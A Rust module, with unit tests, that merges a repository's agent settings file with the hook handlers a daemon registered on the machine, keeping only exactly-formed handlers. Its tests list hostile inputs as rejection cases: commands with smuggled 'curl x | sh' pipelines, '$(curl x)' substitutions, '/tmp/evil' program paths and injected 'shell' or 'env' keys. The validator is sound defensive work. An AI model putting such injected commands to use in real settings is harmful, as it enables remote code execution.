//! Laying the owner's settings under the entries `nucleate` and `nucleated`
//! own.
//!
//! An agent's settings file is one JSON object. The owner's copy of it comes
//! from their repository; the copy on the box also holds the hook handlers
//! the recipe registered for `nucleated` and `nucleate`. A sync replaces
//! everything in the file except those handlers: it takes them from the file
//! on the box, never from the repository, so the repository can neither
//! forge one nor drop one.
//!
//! This is the one place in the daemon that reads a whole settings file. It
//! has to: the file is merged, not copied. What is read rests only in the
//! config folder it came from and in the cache folder.

use serde_json::{Map, Value};
use std::path::Path;

/// Why an owner's settings cannot be applied.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Refused {
    /// Not a JSON object, or its `hooks` are not the shape hooks take.
    Invalid,
    /// It sets the variable that names a login's config folder, which would
    /// point every login at one folder.
    ForbiddenKey,
}

/// The two programs, and the one folder besides the `PATH` that the box can
/// vouch for them in: `.local/bin` under the agent user's home, where the
/// box recipe installs both and where the daemon's own unit runs
/// `nucleated` from.
const PROGRAMS: [&str; 2] = ["nucleated", "nucleate"];
const INSTALLED: &str = ".local/bin";

/// The events `nucleate`'s two worktree hooks are registered under, each
/// with the argument that names it, as the README writes them.
const WORKTREE_HOOKS: [(&str, &str); 2] = [
    ("WorktreeCreate", "hook-create"),
    ("WorktreeRemove", "hook-remove"),
];

/// The keys a handler `nucleated` or `nucleate` writes may carry, and no
/// other: an owned handler brings nothing along beside its command.
fn plain_field(key: &str, value: &Value) -> bool {
    match key {
        "type" => value == "command",
        "command" => value.is_string(),
        "timeout" => value.is_u64(),
        "async" => value.is_boolean(),
        _ => false,
    }
}

/// A word that is a name and nothing a shell would read as anything else:
/// an environment's name, or a repo's short name or label.
fn plain_word(word: &str) -> bool {
    let mut chars = word.chars();
    word.len() <= 128
        && matches!(chars.next(), Some(first) if first.is_ascii_alphanumeric())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/'))
}

/// What tells a hook handler `nucleated` or `nucleate` wrote from one that
/// only starts like one.
///
/// A handler is owned when it is, whole, one of the forms the two programs
/// write: the handler an agent's adapter prints for that event
/// ([`crate::agent::Agent::hooks_block`]), with or without `--env`, or one
/// of the two worktree hooks under its own event. The program is the bare
/// name, as the adapters print it, or the installed binary as the box recipe
/// writes it (`$HOME/.local/bin/<name>`, letter for letter), or that same
/// path written out under the home of the user the sync runs as. Nothing
/// else is owned: no other folder, no quotes, no second command, nothing a
/// shell would expand, no argument the forms do not take, no other key.
pub struct Ours {
    /// `<home>/.local/bin/`, when the home is a path that needs no quoting.
    installed: Option<String>,
}

impl Ours {
    /// For the user this program runs as.
    pub fn on_this_box() -> Ours {
        Ours::installed_under(crate::paths::home().as_deref())
    }

    pub fn installed_under(home: Option<&Path>) -> Ours {
        let installed = home
            .filter(|home| home.is_absolute())
            .and_then(Path::to_str)
            .filter(|home| {
                home.chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/'))
            })
            .map(|home| format!("{}/{INSTALLED}/", home.trim_end_matches('/')));
        Ours { installed }
    }

    /// The command with its program written as the bare name, when the
    /// program is one the box vouches for.
    fn by_name(&self, command: &str) -> Option<String> {
        let (program, arguments) = command.split_once(' ')?;
        let recipe = format!("$HOME/{INSTALLED}/");
        let name = [Some(""), Some(recipe.as_str()), self.installed.as_deref()]
            .into_iter()
            .flatten()
            .filter_map(|folder| program.strip_prefix(folder))
            .find(|name| PROGRAMS.contains(name))?;
        Some(format!("{name} {arguments}"))
    }

    /// Whether `handler`, registered under `event`, is an owned one.
    pub fn owned(&self, event: &str, handler: &Value) -> bool {
        let Some(fields) = handler.as_object() else {
            return false;
        };
        if !fields.contains_key("type")
            || !fields.iter().all(|(key, value)| plain_field(key, value))
        {
            return false;
        }
        let Some(command) = fields
            .get("command")
            .and_then(Value::as_str)
            .and_then(|command| self.by_name(command))
        else {
            return false;
        };
        // The environment a hook command names, if it names one. Only a
        // plain name is ever handed to an adapter to print.
        let env = command
            .rsplit_once(" --env ")
            .map(|(_, env)| env)
            .filter(|env| plain_word(env));
        let printed = crate::agent::NAMES
            .iter()
            .filter_map(|name| crate::agent::by_name(name))
            .any(|agent| {
                let block = agent.hooks_block(env);
                block["hooks"][event]
                    .as_array()
                    .into_iter()
                    .flatten()
                    .flat_map(|group| group["hooks"].as_array().into_iter().flatten())
                    .any(|printed| printed["command"] == command.as_str())
            });
        printed
            || WORKTREE_HOOKS.iter().any(|(under, hook)| {
                let mut words = command
                    .strip_prefix("nucleate ")
                    .unwrap_or_default()
                    .split(' ');
                *under == event
                    && words.next() == Some(hook)
                    // Only `hook-create` takes arguments: the repos every
                    // session starts with.
                    && words.all(|repo| *hook == "hook-create" && plain_word(repo))
            })
    }
}

/// Lay `over` on `base` by the rule the agent's vendor documents for its own
/// layered settings: a single value is replaced, lists are combined with
/// repeats left out, and nested objects are merged key by key.
pub fn overlay(base: Value, over: Value) -> Value {
    match (base, over) {
        (Value::Object(mut base), Value::Object(over)) => {
            for (key, value) in over {
                let merged = match base.remove(&key) {
                    Some(under) => overlay(under, value),
                    None => value,
                };
                base.insert(key, merged);
            }
            Value::Object(base)
        }
        (Value::Array(base), Value::Array(over)) => {
            let mut combined: Vec<Value> = Vec::with_capacity(base.len() + over.len());
            for value in base.into_iter().chain(over) {
                if !combined.contains(&value) {
                    combined.push(value);
                }
            }
            Value::Array(combined)
        }
        (_, over) => over,
    }
}

/// Take every owned handler out of a settings object, and with it every
/// matcher group and event left with no handler, and a `hooks` left with no
/// event. Anything that is not the shape hooks take is left as it is.
pub fn without_owned(ours: &Ours, settings: &mut Map<String, Value>) {
    let Some(Value::Object(hooks)) = settings.get_mut("hooks") else {
        return;
    };
    for (event, groups) in hooks.iter_mut() {
        let Value::Array(groups) = groups else {
            continue;
        };
        for group in groups.iter_mut() {
            // A group that carries anything but a matcher beside its
            // handlers is not one either program wrote. It is left whole.
            if !plain_group(group) {
                continue;
            }
            if let Some(Value::Array(handlers)) = group.get_mut("hooks") {
                handlers.retain(|handler| !ours.owned(event, handler));
            }
        }
        groups.retain(
            |group| !matches!(group.get("hooks"), Some(Value::Array(left)) if left.is_empty()),
        );
    }
    hooks.retain(|_, groups| !matches!(groups, Value::Array(left) if left.is_empty()));
    if hooks.is_empty() {
        settings.remove("hooks");
    }
}

/// A matcher group as `nucleated` and `nucleate` write one: its handlers,
/// and at most a matcher that is a string.
fn plain_group(group: &Value) -> bool {
    group.as_object().is_some_and(|group| {
        group.iter().all(|(key, value)| match key.as_str() {
            "hooks" => value.is_array(),
            "matcher" => value.is_string(),
            _ => false,
        })
    })
}

/// The owned handlers of the settings on the box: per event, each matcher
/// group cut down to its owned handlers, with its matcher and in its order.
fn owned_groups(ours: &Ours, current: &Value) -> Vec<(String, Vec<Value>)> {
    let Some(hooks) = current["hooks"].as_object() else {
        return Vec::new();
    };
    let mut found = Vec::new();
    for (event, groups) in hooks {
        let kept: Vec<Value> = groups
            .as_array()
            .into_iter()
            .flatten()
            .filter(|group| plain_group(group))
            .filter_map(|group| {
                let mut group = group.as_object()?.clone();
                let handlers: Vec<Value> = group
                    .get("hooks")?
                    .as_array()?
                    .iter()
                    .filter(|handler| ours.owned(event, handler))
                    .cloned()
                    .collect();
                if handlers.is_empty() {
                    return None;
                }
                group.insert("hooks".into(), Value::Array(handlers));
                Some(Value::Object(group))
            })
            .collect();
        if !kept.is_empty() {
            found.push((event.clone(), kept));
        }
    }
    found
}

/// Check an owner's settings and take out anything in them that looks owned.
/// `config_dir_var` is the variable that names a login's config folder.
pub fn owners(ours: &Ours, settings: Value, config_dir_var: &str) -> Result<Value, Refused> {
    let Value::Object(mut settings) = settings else {
        return Err(Refused::Invalid);
    };
    if settings
        .get("env")
        .and_then(|env| env.get(config_dir_var))
        .is_some()
    {
        return Err(Refused::ForbiddenKey);
    }
    match settings.get("hooks") {
        None | Some(Value::Object(_)) => {}
        Some(_) => return Err(Refused::Invalid),
    }
    if let Some(Value::Object(hooks)) = settings.get("hooks") {
        if hooks.values().any(|groups| !groups.is_array()) {
            return Err(Refused::Invalid);
        }
    }
    without_owned(ours, &mut settings);
    Ok(Value::Object(settings))
}

/// What a sync writes: the owner's settings, as [`owners`] left them, with
/// the owned handlers of the file on the box added after the owner's own for
/// each event. Applying it again to its own result changes nothing.
pub fn merged(ours: &Ours, owner: &Value, current: Option<&Value>) -> Value {
    let mut result = owner.as_object().cloned().unwrap_or_default();
    let kept = current
        .map(|current| owned_groups(ours, current))
        .unwrap_or_default();
    if !kept.is_empty() {
        let hooks = result
            .entry("hooks")
            .or_insert_with(|| Value::Object(Map::new()));
        if let Value::Object(hooks) = hooks {
            for (event, groups) in kept {
                let list = hooks
                    .entry(event)
                    .or_insert_with(|| Value::Array(Vec::new()));
                if let Value::Array(list) = list {
                    list.extend(groups);
                }
            }
        }
    }
    Value::Object(result)
}

/// Whether the settings on the box still say what the owner's do, the owned
/// handlers aside: registering `nucleated`'s hooks again is not a change
/// made by hand.
pub fn same_but_for_owned(ours: &Ours, owner: &Value, current: &Value) -> bool {
    let Some(mut current) = current.as_object().cloned() else {
        return false;
    };
    without_owned(ours, &mut current);
    let mut owner = owner.as_object().cloned().unwrap_or_default();
    without_owned(ours, &mut owner);
    owner == current
}

/// The file as it is written: readable, keys in order, one final newline.
pub fn text(settings: &Value) -> String {
    let mut text = serde_json::to_string_pretty(settings).unwrap_or_else(|_| "{}".into());
    text.push('\n');
    text
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const VAR: &str = "CLAUDE_CONFIG_DIR";

    fn ours() -> Ours {
        Ours::installed_under(Some(Path::new("/home/agent")))
    }

    fn handler(command: &str) -> Value {
        json!({ "type": "command", "command": command, "timeout": 5 })
    }

    fn owned(event: &str, command: &str) -> bool {
        ours().owned(event, &handler(command))
    }

    #[test]
    fn every_handler_an_adapter_prints_is_owned_under_its_own_event() {
        for name in crate::agent::NAMES {
            let agent = crate::agent::by_name(name).unwrap();
            for env in [None, Some("client-a")] {
                let block = agent.hooks_block(env);
                let events = block["hooks"].as_object().unwrap();
                assert!(!events.is_empty());
                for (event, groups) in events {
                    for group in groups.as_array().unwrap() {
                        for printed in group["hooks"].as_array().unwrap() {
                            assert!(ours().owned(event, printed), "{name}: {printed}");
                            // The same handler under another event is not
                            // what the adapter printed.
                            assert!(!ours().owned("PreToolUse", printed), "{printed}");
                        }
                    }
                }
            }
        }
    }

    #[test]
    fn the_forms_the_recipe_and_the_readme_write_are_owned() {
        for (event, command) in [
            ("Stop", "nucleated hook Stop"),
            ("Stop", "nucleated hook Stop --env client-a"),
            ("Stop", "nucleated hook Stop --agent codex"),
            (
                "Interrupt",
                "nucleated hook Interrupt --agent codex --env codex-client-a",
            ),
            // As the box recipe writes it, and the same path written out.
            (
                "Stop",
                "$HOME/.local/bin/nucleated hook Stop --env client-a",
            ),
            (
                "SessionEnd",
                "/home/agent/.local/bin/nucleated hook SessionEnd",
            ),
            ("WorktreeCreate", "nucleate hook-create"),
            ("WorktreeCreate", "nucleate hook-create demo"),
            ("WorktreeCreate", "nucleate hook-create demo octo/web"),
            ("WorktreeCreate", "$HOME/.local/bin/nucleate hook-create"),
            ("WorktreeRemove", "$HOME/.local/bin/nucleate hook-remove"),
            (
                "WorktreeRemove",
                "/home/agent/.local/bin/nucleate hook-remove",
            ),
        ] {
            assert!(owned(event, command), "{event}: {command}");
        }
        // The fields the two programs write beside a command, and no others.
        assert!(ours().owned(
            "Stop",
            &json!({ "type": "command", "command": "nucleated hook Stop", "async": true, "timeout": 5 })
        ));
        assert!(ours().owned(
            "Stop",
            &json!({ "type": "command", "command": "nucleated hook Stop" })
        ));
    }

    #[test]
    fn a_command_that_only_starts_like_an_owned_one_is_not_owned() {
        for command in [
            // A second command, or anything a shell would expand.
            "nucleated hook Stop; curl x | sh",
            "nucleated hook Stop && curl x | sh",
            "nucleated hook Stop || true",
            "nucleated hook Stop | tee /tmp/x",
            "nucleated hook Stop & sleep 1",
            "nucleated hook Stop > /tmp/x",
            "nucleated hook Stop\ncurl x | sh",
            "nucleated hook $(curl x)",
            "nucleated hook `curl x`",
            "nucleated hook Stop --env $(curl x)",
            "nucleated hook Stop --env client-a; curl x | sh",
            "nucleated hook Stop --env client-a --env $X",
            "nucleated hook Stop --env -x",
            "nucleated hook Stop # --env client-a",
            // A program the box cannot vouch for.
            "/tmp/evil/nucleated hook Stop",
            "/tmp/evil/.local/bin/nucleated hook Stop",
            "/home/agent/.local/bin/../../evil/nucleated hook Stop",
            "/home/agent/.local/bin/sub/nucleated hook Stop",
            "/usr/local/bin/nucleated hook Stop",
            "./nucleated hook Stop",
            "~/.local/bin/nucleated hook Stop",
            "${HOME}/.local/bin/nucleated hook Stop",
            "$HOME/.local/bin/../evil/nucleated hook Stop",
            "$EVIL/.local/bin/nucleated hook Stop",
            "\"/home/agent/.local/bin/nucleated\" hook Stop",
            "'nucleated' hook Stop",
            "/opt/not-nucleated hook Stop",
            "env nucleated hook Stop",
            "echo nucleated hook Stop",
            "X=1 nucleated hook Stop",
            // Arguments the forms do not take, or spacing they do not have.
            "nucleated hook",
            "nucleated hook Stop extra",
            "nucleated hook Stop --verbose",
            "nucleated hook Stop --agent another",
            "nucleated hook Stop --env client-a --agent codex",
            "nucleated  hook Stop",
            "nucleated hook Stop ",
            " nucleated hook Stop",
            "nucleated\thook Stop",
            "nucleated hook PreToolUse",
            "nucleated hook stop",
            "nucleated status",
            "nucleated run",
            "nucleate hook Stop",
            "",
        ] {
            assert!(!owned("Stop", command), "{command:?}");
        }
        for (event, command) in [
            ("WorktreeCreate", "nucleate hook-create; curl x | sh"),
            ("WorktreeCreate", "nucleate hook-create $(curl x)"),
            ("WorktreeCreate", "nucleate hook-create --root /tmp/evil"),
            ("WorktreeCreate", "nucleate hook-create demo "),
            ("WorktreeCreate", "/tmp/evil/nucleate hook-create"),
            ("WorktreeCreate", "nucleate hook-remove"),
            ("WorktreeCreate", "nucleate status"),
            ("WorktreeCreate", "nucleated hook-create"),
            ("WorktreeRemove", "nucleate hook-remove demo"),
            ("WorktreeRemove", "nucleate hook-remove && curl x | sh"),
            ("WorktreeRemove", "nucleate hook-create"),
            ("Stop", "nucleate hook-create"),
        ] {
            assert!(!owned(event, command), "{event}: {command:?}");
        }
        // A home the box cannot write without quoting vouches for no path,
        // and neither does no home at all.
        for home in [
            Some("/home/an agent"),
            Some("/home/$(x)"),
            Some("relative"),
            None,
        ] {
            let ours = Ours::installed_under(home.map(Path::new));
            let home = home.unwrap_or_default();
            assert!(!ours.owned(
                "Stop",
                &handler(&format!("{home}/.local/bin/nucleated hook Stop"))
            ));
            assert!(ours.owned("Stop", &handler("nucleated hook Stop")));
        }
    }

    #[test]
    fn an_owned_command_brings_no_other_key_along() {
        let with = |key: &str, value: Value| {
            let mut handler = handler("nucleated hook Stop");
            handler[key] = value;
            handler
        };
        for smuggled in [
            with("shell", json!("/tmp/evil/sh")),
            with("env", json!({ "PATH": "/tmp/evil" })),
            with("if", json!("Bash(rm *)")),
            with("statusMessage", json!("a sentence")),
            with("once", json!(true)),
            with("timeout", json!("5; curl x | sh")),
            with("timeout", json!(-1)),
            with("async", json!("true")),
            with("type", json!("prompt")),
            with("type", json!(["command"])),
            with("command", json!(["nucleated hook Stop"])),
        ] {
            assert!(!ours().owned("Stop", &smuggled), "{smuggled}");
        }
        // Only a command handler runs a program, and a handler is an object.
        assert!(!ours().owned("Stop", &json!({ "command": "nucleated hook Stop" })));
        assert!(!ours().owned("Stop", &json!("nucleated hook Stop")));
        assert!(!ours().owned("Stop", &json!(null)));
    }

    #[test]
    fn the_owners_settings_replace_the_file_and_the_owned_handlers_stay() {
        let owner = owners(
            &ours(),
            json!({
                "permissions": { "deny": ["Read(./.env)"] },
                "hooks": { "Stop": [{ "hooks": [handler("say done")] }] },
            }),
            VAR,
        )
        .unwrap();
        let on_the_box = json!({
            "model": "left over from before",
            "hooks": {
                "Stop": [{ "hooks": [handler("old-notify.sh"), handler("nucleated hook Stop --env a")] }],
                "Notification": [{ "matcher": "permission_prompt", "hooks": [handler("$HOME/.local/bin/nucleated hook Notification --env a")] }],
                "PreToolUse": [{ "matcher": "Bash", "hooks": [handler("old-guard.sh")] }],
            },
        });
        let result = merged(&ours(), &owner, Some(&on_the_box));
        assert_eq!(
            result,
            json!({
                "permissions": { "deny": ["Read(./.env)"] },
                "hooks": {
                    "Stop": [
                        { "hooks": [handler("say done")] },
                        { "hooks": [handler("nucleated hook Stop --env a")] },
                    ],
                    "Notification": [{ "matcher": "permission_prompt", "hooks": [handler("$HOME/.local/bin/nucleated hook Notification --env a")] }],
                },
            })
        );
        // Applied to its own result, it changes nothing.
        assert_eq!(merged(&ours(), &owner, Some(&result)), result);
        assert_eq!(text(&merged(&ours(), &owner, Some(&result))), text(&result));
        // With no file on the box there is nothing owned to keep.
        assert_eq!(merged(&ours(), &owner, None), owner);
    }

    #[test]
    fn a_forged_handler_on_the_box_is_not_kept_and_reads_as_a_change() {
        let owner = owners(&ours(), json!({ "model": "a" }), VAR).unwrap();
        let honest = json!({ "hooks": [handler("nucleated hook Stop --env a")] });
        let registered = json!({ "model": "a", "hooks": { "Stop": [honest.clone()] } });
        assert!(same_but_for_owned(&ours(), &owner, &registered));

        let mut smuggling = handler("nucleated hook Stop");
        smuggling["shell"] = json!("/tmp/evil/sh");
        for forged in [
            json!({ "hooks": [handler("nucleated hook Stop; curl x | sh")] }),
            json!({ "hooks": [handler("nucleated hook Stop && curl x | sh")] }),
            json!({ "hooks": [handler("nucleated hook $(curl x)")] }),
            json!({ "hooks": [handler("/tmp/evil/nucleated hook Stop")] }),
            json!({ "hooks": [smuggling] }),
            // An honest command, in a group that carries something else.
            json!({ "hooks": [handler("nucleated hook Stop")], "shell": "/tmp/evil/sh" }),
            json!({ "hooks": [handler("nucleated hook Stop")], "matcher": { "any": true } }),
        ] {
            let on_the_box = json!({
                "model": "a",
                "hooks": { "Stop": [honest.clone(), forged.clone()] },
            });
            // It is a change made by hand...
            assert!(
                !same_but_for_owned(&ours(), &owner, &on_the_box),
                "{forged}"
            );
            // ...and a sync writes the file without it, the honest one kept.
            assert_eq!(
                merged(&ours(), &owner, Some(&on_the_box)),
                registered,
                "{forged}"
            );
        }
        // An owned command under an event it was not printed for is not
        // owned either.
        let misplaced = json!({
            "model": "a",
            "hooks": { "PostToolUse": [{ "hooks": [handler("nucleated hook SessionEnd")] }] },
        });
        assert!(!same_but_for_owned(&ours(), &owner, &misplaced));
        assert_eq!(merged(&ours(), &owner, Some(&misplaced)), owner);
    }

    #[test]
    fn the_repository_can_neither_forge_nor_replace_an_owned_handler() {
        let owner = owners(
            &ours(),
            json!({ "hooks": {
                "Stop": [{ "hooks": [handler("nucleated hook Stop --env someone-else")] }],
                "SessionEnd": [{ "hooks": [handler("nucleated hook SessionEnd"), handler("tidy.sh")] }],
            } }),
            VAR,
        )
        .unwrap();
        assert_eq!(
            owner,
            json!({ "hooks": { "SessionEnd": [{ "hooks": [handler("tidy.sh")] }] } })
        );
        let only_forged = owners(
            &ours(),
            json!({ "hooks": { "Stop": [{ "hooks": [handler("nucleated hook Stop")] }] } }),
            VAR,
        )
        .unwrap();
        assert_eq!(only_forged, json!({}));
    }

    #[test]
    fn settings_that_are_not_settings_are_refused() {
        let owners = |settings: Value| owners(&ours(), settings, VAR);
        assert_eq!(owners(json!([1, 2])), Err(Refused::Invalid));
        assert_eq!(owners(json!("settings")), Err(Refused::Invalid));
        assert_eq!(owners(json!({ "hooks": [] })), Err(Refused::Invalid));
        assert_eq!(
            owners(json!({ "hooks": { "Stop": "notify.sh" } })),
            Err(Refused::Invalid)
        );
        assert_eq!(
            owners(json!({ "env": { "CLAUDE_CONFIG_DIR": "/home/agent/.claude" } })),
            Err(Refused::ForbiddenKey)
        );
        assert!(owners(json!({ "env": { "EDITOR": "vi" } })).is_ok());
    }

    #[test]
    fn an_overlay_replaces_values_combines_lists_and_merges_objects() {
        let laid = overlay(
            json!({
                "model": "a",
                "permissions": { "deny": ["one", "two"], "defaultMode": "plan" },
                "env": { "A": "1" },
            }),
            json!({
                "model": "b",
                "permissions": { "deny": ["two", "three"] },
                "env": { "B": "2" },
            }),
        );
        assert_eq!(
            laid,
            json!({
                "model": "b",
                "permissions": { "deny": ["one", "two", "three"], "defaultMode": "plan" },
                "env": { "A": "1", "B": "2" },
            })
        );
    }

    #[test]
    fn registering_the_hooks_again_is_not_a_change_and_anything_else_is() {
        let owner = owners(&ours(), json!({ "model": "a" }), VAR).unwrap();
        let same = |current: Value| same_but_for_owned(&ours(), &owner, &current);
        assert!(same(json!({
            "model": "a",
            "hooks": { "Stop": [{ "hooks": [handler("nucleated hook Stop")] }] },
        })));
        assert!(same(json!({ "model": "a" })));
        assert!(!same(json!({ "model": "b" })));
        assert!(!same(
            json!({ "model": "a", "hooks": { "Stop": [{ "hooks": [handler("mine.sh")] }] } })
        ));
        assert!(!same(json!([])));
    }
}
